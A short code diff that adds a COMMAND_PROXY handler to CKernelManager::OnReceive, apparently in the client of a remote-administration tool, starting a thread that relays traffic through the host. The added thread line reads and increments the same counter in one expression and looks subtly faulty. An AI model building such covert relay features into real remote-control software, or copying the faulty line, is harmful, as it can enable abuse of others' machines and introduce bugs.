@@ -126,6 +126,12 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	switch(szBuffer[0])
 	{
+	case COMMAND_PROXY: {
+		m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true);
+		m_hThread[m_ulThreadCount++].h = CreateThread(NULL, 0, LoopProxyManager, &m_hThread[m_ulThreadCount], 0, NULL);;
+		break;
+	}
+	
 	case COMMAND_SHARE:
 		if (ulLength > 2) {
 			switch (szBuffer[1]) {
